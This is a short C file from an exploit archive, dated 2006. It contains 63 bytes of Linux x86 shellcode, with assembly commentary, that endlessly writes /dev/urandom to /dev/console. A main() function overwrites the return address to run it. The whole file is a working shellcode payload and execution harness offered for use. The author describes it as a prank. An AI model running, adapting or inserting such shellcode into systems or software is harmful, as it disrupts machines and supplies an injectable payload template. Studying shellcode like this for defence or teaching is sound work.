/*
 * (linux/x86) cat /dev/urandom > /dev/console, no real profit just for kicks - 63 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x31\xc9"              // xor %ecx,%ecx
	"\x51"                  // push %ecx
	"\x68\x6e\x64\x6f\x6d"  // push $0x6d6f646e
	"\x68\x2f\x75\x72\x61"  // push $0x6172752f
	"\x68\x2f\x64\x65\x76"  // push $0x7665642f
	"\x89\xe3"              // mov %esp,%ebx
	"\xb1\x02"              // mov $0x2,%cl

	//
	// <_openit>:
	//

	"\x6a\x05"              // push $0x5
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\xcd\x80"              // int $0x80
	"\x96"                  // xchg %eax,%esi
	"\x5f"                  // pop %edi
	"\x5d"                  // pop %ebp
	"\x5d"                  // pop %ebp
	"\x68\x73\x6f\x6c\x65"  // push $0x656c6f73
	"\x68\x2f\x63\x6f\x6e"  // push $0x6e6f632f
	"\x57"                  // push %edi
	"\xe2\xe9"              // loop <_openit>

	"\x89\xc3"              // mov %eax,%ebx

	//
	// <_makeio>:
	//

	"\xb2\x04"              // mov $0x4,%dl
	"\x89\xe1"              // mov %esp,%ecx

	//
	// <_pre_ioloop>:
	//

	"\xb0\x03"              // mov $0x3,%al
	"\xf8"                  // clc

	//
	// <_ioloop>:
	//

	"\xcd\x80"              // int $0x80
	"\x87\xde"              // xchg %ebx,%esi
	"\x72\xf7"              // jc <_pre_ioloop>
	"\xf9"                  // stc
	"\xeb\xf7";             // jmp <_ioloop>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]